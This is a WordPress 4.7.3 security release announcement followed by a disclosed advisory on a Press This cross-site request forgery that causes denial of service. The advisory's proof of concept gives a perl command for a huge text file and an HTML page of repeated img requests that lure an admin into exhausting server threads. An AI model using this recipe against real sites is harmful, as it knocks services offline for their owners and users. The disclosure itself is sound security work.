# WordPress 4.7.3 Security and Maintenance Release

---

WordPress 4.7.3 is now available. This is a **security release** for all previous versions and we strongly encourage you to update your sites immediately.

WordPress versions 4.7.2 and earlier are affected by six security issues:

1. Cross-site scripting (XSS) via media file metadata.  Reported by [Chris Andrè Dale](https://www.securesolutions.no/), [Yorick Koster](https://twitter.com/yorickkoster), and Simon P. Briggs.
2. Control characters can trick redirect URL validation.  Reported by [Daniel Chatfield](http://www.danielchatfield.com/).
3. Unintended files can be deleted by administrators using the plugin deletion functionality.  Reported by [TrigInc](https://hackerone.com/triginc) and [xuliang](http://b.360.cn/).
4. Cross-site scripting (XSS) via video URL in YouTube embeds.  Reported by [Marc Montpas](https://twitter.com/marcs0h).
5. Cross-site scripting (XSS) via taxonomy term names.  Reported by [Delta](https://profiles.wordpress.org/deltamgm2/).
6. Cross-site request forgery (CSRF) in Press This leading to excessive use of server resources.  Reported by Sipke Mellema.

Thank you to the reporters for practicing [responsible disclosure](https://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/).

In addition to the security issues above, WordPress 4.7.3 contains 39 maintenance fixes to the 4.7 release series. For more information, see the [release notes](https://codex.wordpress.org/Version_4.7.3) or consult the [list of changes](https://core.trac.wordpress.org/query?status=closed&milestone=4.7.3&group=component&col=id&col=summary&col=component&col=status&col=owner&col=type&col=priority&col=keywords&order=priority).

[Download WordPress 4.7.3](https://wordpress.org/download/) or venture over to Dashboard → Updates and simply click “Update Now.” Sites that support automatic background updates are already beginning to update to WordPress 4.7.3.

Subject: Cross-Site Request Forgery in WordPress Press This function allows

------------------------------------------------------------------------
Cross-Site Request Forgery in WordPress Press This function allows DoS
------------------------------------------------------------------------
Sipke Mellema, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A Cross-Site Request Forgery (CSRF) vulnerability exists on the Press
This page of WordPress. This issue can be used to create a Denial of
Service (DoS) condition  if an authenticated administrator visits a
malicious URL.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160718-0005

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on WordPress [2] version 4.5.3.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is resolved in WordPress version 4.7.3. [3]

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
WordPress is web software you can use to create a website, blog, or
app. A Cross-Site Request Forgery (CSRF) vulnerability exists on the
Press This page of WordPress. This issue can be used to create a Denial
of Service (DoS) condition of an affected WordPress site.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
WordPress' Press This [4] function allows quick publishing with a
special web browser bookmarklet. An admin can also visit the Press This
page directly. One of the features of Press This is scanning an external
server for embeddable content. This is done with a GET request to:
/wp-admin/press-this.php?u=<URL>&url-scan-submit=Scan

When this URL is called, Press This will download the page located at
"URL" and look for content such as images and other embeddable elements.
No maximum is set for the amount of data Press This can retrieve when
scanning. This behavior can be abused by setting the external URL to a
huge file and have an authenticated admin visit it. The PHP process will
use 100% of its CPU resources to process the file. If an authenticated
admin can be lured to an external page, then the malicious URL can be
called many times, blocking all PHP server threads. This will cause the
server to be unreachable for a while.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
On an external server, create a large text file with the command:
perl -e 'print "<>"x28000000' > foo.txt

Next, create a file called dos.html on the external server with enough
entries to fill the connection pool of the WordPress server, as follows:
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=c'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=d'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=e'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=f'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=g'>
[..]
(replace <wp server> with the WordPress server address and <external
server> with the external server)

Now have a logged in admin visit dos.html. The server will be down for a
while.
